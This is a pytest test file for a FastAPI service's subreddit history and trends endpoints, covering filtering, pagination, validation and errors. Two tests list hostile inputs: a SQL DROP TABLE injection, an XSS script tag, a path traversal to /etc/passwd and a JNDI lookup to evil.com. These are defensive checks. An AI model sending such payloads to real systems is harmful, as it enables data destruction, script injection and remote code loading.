# ABOUTME: Test suite for History and Trends API endpoints (Prompt 11)
# ABOUTME: Covers date filtering, pagination, response validation, and error handling

from datetime import UTC, datetime, timedelta
from unittest.mock import patch

from fastapi.testclient import TestClient
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.db.base import Base
from app.db.session import get_db
from app.main import app
from app.models.types import ActivityPattern, TrendData
from app.services.change_detection_service import ChangeDetectionService
from app.services.storage_service import StorageService


class TestHistoryEndpoint:
    """Test suite for the /history/{subreddit} endpoint."""

    @pytest.fixture
    def db_session(self):
        """Create test database session."""
        engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool
        )
        Base.metadata.create_all(engine)
        TestingSessionLocal = sessionmaker(
            autocommit=False,
            autoflush=False,
            bind=engine,
            expire_on_commit=False
        )
        session = TestingSessionLocal()

        # Override dependency
        def override_get_db():
            try:
                yield session
            finally:
                pass  # Don't close session here, let fixture handle it

        app.dependency_overrides[get_db] = override_get_db
        yield session
        session.close()
        app.dependency_overrides.clear()

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def storage_service(self, db_session):
        """Create storage service with test data."""
        service = StorageService(db_session)

        # Create test check runs with different dates
        base_time = datetime.now(UTC) - timedelta(days=10)

        for i in range(15):  # Create 15 check runs over 10 days
            check_time = base_time + timedelta(days=i//2, hours=i%3)
            check_run_id = service.create_check_run("technology", "ai")

            # Update timestamp to simulate different check times
            check_run = service.get_check_run_by_id(check_run_id)
            check_run.timestamp = check_time
            db_session.commit()

            # Add some posts for each check run
            for j in range(3):
                post_data = {
                    "post_id": f"post_{i}_{j}",
                    "subreddit": "technology",
                    "title": f"Test Post {i}-{j}",
                    "author": f"user_{j}",
                    "url": f"https://example.com/post_{i}_{j}",
                    "permalink": f"/r/technology/comments/post_{i}_{j}/",
                    "score": 100 + i * 10 + j,
                    "num_comments": 20 + i + j,
                    "created_utc": check_time,
                    "is_self": False,
                    "selftext": "",
                    "upvote_ratio": 0.85,
                    "over_18": False,
                    "spoiler": False,
                    "stickied": False,
                    "check_run_id": check_run_id
                }
                service.save_post(post_data)

        return service

    def test_history_endpoint_basic_functionality(self, client, storage_service):
        """Test basic history endpoint functionality."""
        response = client.get("/history/technology")

        assert response.status_code == 200
        data = response.json()

        assert data["subreddit"] == "technology"
        assert data["total_checks"] > 0
        assert "date_range" in data
        assert "checks" in data
        assert "pagination" in data
        assert isinstance(data["checks"], list)

    def test_history_endpoint_with_date_filtering(self, client, storage_service):
        """Test history endpoint with start_date and end_date filtering."""
        start_date = (datetime.now(UTC) - timedelta(days=5)).strftime("%Y-%m-%dT%H:%M:%S")
        end_date = (datetime.now(UTC) - timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%S")

        response = client.get(
            f"/history/technology?start_date={start_date}&end_date={end_date}"
        )

        assert response.status_code == 200
        data = response.json()

        assert data["subreddit"] == "technology"
        assert len(data["checks"]) > 0

        # Verify date filtering worked
        for check in data["checks"]:
            check_date = datetime.fromisoformat(check["timestamp"].replace("Z", "+00:00"))
            assert start_date <= check_date.isoformat() <= end_date

    def test_history_endpoint_pagination(self, client, storage_service):
        """Test history endpoint pagination functionality."""
        # Test first page
        response = client.get("/history/technology?page=1&limit=5")
        assert response.status_code == 200
        data = response.json()

        assert len(data["checks"]) <= 5
        assert data["pagination"]["page"] == 1
        assert data["pagination"]["limit"] == 5
        assert data["pagination"]["total_pages"] >= 1
        assert data["pagination"]["total_items"] > 0

        # Test second page if there are enough items
        if data["pagination"]["total_pages"] > 1:
            response = client.get("/history/technology?page=2&limit=5")
            assert response.status_code == 200
            page2_data = response.json()

            assert page2_data["pagination"]["page"] == 2
            # Ensure different results on different pages
            assert data["checks"] != page2_data["checks"]

    def test_history_endpoint_empty_results(self, client, storage_service):
        """Test history endpoint with subreddit that has no data."""
        response = client.get("/history/nonexistent")

        assert response.status_code == 200
        data = response.json()

        assert data["subreddit"] == "nonexistent"
        assert data["total_checks"] == 0
        assert len(data["checks"]) == 0
        assert data["date_range"]["start"] is None
        assert data["date_range"]["end"] is None

    def test_history_endpoint_invalid_parameters(self, client, storage_service):
        """Test history endpoint with invalid parameters."""
        # Test invalid date format
        response = client.get("/history/technology?start_date=invalid-date")
        assert response.status_code == 422

        # Test negative page number
        response = client.get("/history/technology?page=-1")
        assert response.status_code == 422

        # Test invalid limit
        response = client.get("/history/technology?limit=0")
        assert response.status_code == 422

        # Test excessive limit
        response = client.get("/history/technology?limit=1000")
        assert response.status_code == 422

    def test_history_endpoint_malicious_input(self, client, storage_service):
        """Test history endpoint with malicious input attempts."""
        malicious_inputs = [
            "technology'; DROP TABLE check_runs; --",
            "technology<script>alert('xss')</script>",
            "technology../../etc/passwd",
            "technology${jndi:ldap://evil.com/}",
        ]

        for malicious_input in malicious_inputs:
            response = client.get(f"/history/{malicious_input}")
            # Should return 404 because FastAPI URL routing fails before validation
            assert response.status_code in [404, 422]


class TestTrendsEndpoint:
    """Test suite for the /trends/{subreddit} endpoint."""

    @pytest.fixture
    def db_session(self):
        """Create test database session."""
        engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool
        )
        Base.metadata.create_all(engine)
        TestingSessionLocal = sessionmaker(
            autocommit=False,
            autoflush=False,
            bind=engine,
            expire_on_commit=False
        )
        session = TestingSessionLocal()

        # Override dependency
        def override_get_db():
            try:
                yield session
            finally:
                pass  # Don't close session here, let fixture handle it

        app.dependency_overrides[get_db] = override_get_db
        yield session
        session.close()
        app.dependency_overrides.clear()

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def change_detection_service(self, db_session):
        """Create change detection service with mock data."""
        storage_service = StorageService(db_session)
        service = ChangeDetectionService(db_session, storage_service)

        # Create test data for trend analysis
        base_time = datetime.now(UTC) - timedelta(days=7)

        for i in range(7):  # Create 7 days of data
            for hour in [9, 14, 18]:  # Three posts per day at different hours
                check_run_id = storage_service.create_check_run("technology", "ai")
                post_time = base_time + timedelta(days=i, hours=hour)

                # Update check run timestamp
                check_run = storage_service.get_check_run_by_id(check_run_id)
                check_run.timestamp = post_time
                db_session.commit()

                # Add posts with varying engagement
                post_data = {
                    "post_id": f"trend_post_{i}_{hour}",
                    "subreddit": "technology",
                    "title": f"Trending Post Day {i} Hour {hour}",
                    "author": f"user_{i}",
                    "url": f"https://example.com/trend_{i}_{hour}",
                    "permalink": f"/r/technology/comments/trend_post_{i}_{hour}/",
                    "score": 50 + i * 20 + hour,  # Increasing trend
                    "num_comments": 10 + i * 5 + hour // 2,
                    "created_utc": post_time,
                    "is_self": False,
                    "selftext": "",
                    "upvote_ratio": 0.85,
                    "over_18": False,
                    "spoiler": False,
                    "stickied": False,
                    "check_run_id": check_run_id
                }
                storage_service.save_post(post_data)

        return service

    @patch('app.services.change_detection_service.ChangeDetectionService.get_subreddit_trends')
    def test_trends_endpoint_basic_functionality(self, mock_trends, client, change_detection_service):
        """Test basic trends endpoint functionality."""
        # Mock the trend data
        mock_trend_data = TrendData(
            subreddit="technology",
            analysis_period_days=7,
            start_date=datetime.now(UTC) - timedelta(days=7),
            end_date=datetime.now(UTC),
            total_posts=42,
            total_comments=150,
            average_posts_per_day=6.0,
            average_comments_per_day=21.4,
            average_score=150.0,
            median_score=120.0,
            score_standard_deviation=45.2,
            engagement_trend=ActivityPattern.INCREASING,
            best_posting_hour=14,
            best_posting_day=2,
            peak_activity_periods=["afternoon"],
            predicted_daily_posts=6.5,
            predicted_daily_engagement=180.0,
            trend_confidence=0.85,
            change_from_previous_period=15.7,
            is_trending_up=True,
            is_trending_down=False
        )
        mock_trends.return_value = mock_trend_data

        response = client.get("/trends/technology")

        assert response.status_code == 200
        data = response.json()

        assert data["subreddit"] == "technology"
        assert data["analysis_period_days"] == 7  # Default
        assert "trend_data" in data
        assert "generated_at" in data

        trend_data = data["trend_data"]
        assert trend_data["average_posts_per_day"] == 6.0
        assert trend_data["engagement_trend"].upper() == "INCREASING"
        assert trend_data["best_posting_hour"] == 14

    @patch('app.services.change_detection_service.ChangeDetectionService.get_subreddit_trends')
    def test_trends_endpoint_custom_days(self, mock_trends, client, change_detection_service):
        """Test trends endpoint with custom days parameter."""
        mock_trend_data = TrendData(
            subreddit="technology",
            analysis_period_days=14,
            start_date=datetime.now(UTC) - timedelta(days=14),
            end_date=datetime.now(UTC),
            total_posts=28,
            total_comments=98,
            average_posts_per_day=2.0,
            average_comments_per_day=7.0,
            average_score=120.0,
            median_score=100.0,
            score_standard_deviation=30.5,
            engagement_trend=ActivityPattern.STEADY,
            best_posting_hour=16,
            best_posting_day=4,
            peak_activity_periods=["evening"],
            predicted_daily_posts=2.2,
            predicted_daily_engagement=110.0,
            trend_confidence=0.78,
            change_from_previous_period=3.4,
            is_trending_up=False,
            is_trending_down=False
        )
        mock_trends.return_value = mock_trend_data

        response = client.get("/trends/technology?days=14")

        assert response.status_code == 200
        data = response.json()

        assert data["analysis_period_days"] == 14
        mock_trends.assert_called_once_with("technology", 14)

    def test_trends_endpoint_empty_data(self, client, change_detection_service):
        """Test trends endpoint with subreddit that has no data."""
        response = client.get("/trends/nonexistent")

        assert response.status_code == 200
        data = response.json()

        assert data["subreddit"] == "nonexistent"
        assert data["analysis_period_days"] == 7
        # Should have empty or default trend data structure

    def test_trends_endpoint_invalid_parameters(self, client, change_detection_service):
        """Test trends endpoint with invalid parameters."""
        # Test invalid days parameter
        response = client.get("/trends/technology?days=-5")
        assert response.status_code == 422

        # Test excessive days parameter
        response = client.get("/trends/technology?days=1000")
        assert response.status_code == 422

        # Test non-integer days parameter
        response = client.get("/trends/technology?days=abc")
        assert response.status_code == 422

    def test_trends_endpoint_malicious_input(self, client, change_detection_service):
        """Test trends endpoint with malicious input attempts."""
        malicious_inputs = [
            "technology'; DROP TABLE check_runs; --",
            "technology<script>alert('xss')</script>",
            "technology../../etc/passwd",
            "technology${jndi:ldap://evil.com/}",
        ]

        for malicious_input in malicious_inputs:
            response = client.get(f"/trends/{malicious_input}")
            # Should return 404 because FastAPI URL routing fails before validation
            assert response.status_code in [404, 422]

    @patch('app.services.change_detection_service.ChangeDetectionService.get_subreddit_trends')
    def test_trends_endpoint_service_error(self, mock_trends, client, change_detection_service):
        """Test trends endpoint when service raises an error."""
        mock_trends.side_effect = Exception("Database error")

        response = client.get("/trends/technology")

        assert response.status_code == 500
        data = response.json()
        assert "detail" in data


class TestResponseCaching:
    """Test suite for response caching behavior."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_history_response_headers(self, client):
        """Test that history endpoint returns appropriate cache headers."""
        response = client.get("/history/technology")

        # Should include cache-related headers for performance
        # Note: Actual cache headers would be implemented in the endpoint
        assert response.status_code in [200, 404]  # Either success or no data

    def test_trends_response_headers(self, client):
        """Test that trends endpoint returns appropriate cache headers."""
        response = client.get("/trends/technology")

        # Should include cache-related headers for performance
        # Note: Actual cache headers would be implemented in the endpoint
        assert response.status_code in [200, 500]  # Either success or service error


class TestEndpointIntegration:
    """Integration tests for both endpoints working together."""

    @pytest.fixture
    def db_session(self):
        """Create test database session."""
        engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool
        )
        Base.metadata.create_all(engine)
        TestingSessionLocal = sessionmaker(
            autocommit=False,
            autoflush=False,
            bind=engine,
            expire_on_commit=False
        )
        session = TestingSessionLocal()

        # Override dependency
        def override_get_db():
            try:
                yield session
            finally:
                pass  # Don't close session here, let fixture handle it

        app.dependency_overrides[get_db] = override_get_db
        yield session
        session.close()
        app.dependency_overrides.clear()

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_endpoints_with_same_subreddit(self, client, db_session):
        """Test that both endpoints work with the same subreddit data."""
        # Create some test data
        storage_service = StorageService(db_session)
        check_run_id = storage_service.create_check_run("technology", "ai")

        post_data = {
            "post_id": "integration_test_post",
            "subreddit": "technology",
            "title": "Integration Test Post",
            "author": "test_user",
            "url": "https://example.com/integration",
            "permalink": "/r/technology/comments/integration_test_post/",
            "score": 100,
            "num_comments": 25,
            "created_utc": datetime.now(UTC),
            "is_self": False,
            "selftext": "",
            "upvote_ratio": 0.85,
            "over_18": False,
            "spoiler": False,
            "stickied": False,
            "check_run_id": check_run_id
        }
        storage_service.save_post(post_data)

        # Test history endpoint
        history_response = client.get("/history/technology")
        assert history_response.status_code == 200

        # Test trends endpoint
        trends_response = client.get("/trends/technology")
        assert trends_response.status_code in [200, 500]  # May fail due to insufficient data

    def test_concurrent_endpoint_access(self, client, db_session):
        """Test that both endpoints can be accessed concurrently."""
        import threading

        results = []

        def call_history():
            response = client.get("/history/technology")
            results.append(("history", response.status_code))

        def call_trends():
            response = client.get("/trends/technology")
            results.append(("trends", response.status_code))

        # Start both threads
        thread1 = threading.Thread(target=call_history)
        thread2 = threading.Thread(target=call_trends)

        thread1.start()
        thread2.start()

        # Wait for completion
        thread1.join()
        thread2.join()

        # Verify both completed
        assert len(results) == 2
        assert any(r[0] == "history" for r in results)
        assert any(r[0] == "trends" for r in results)
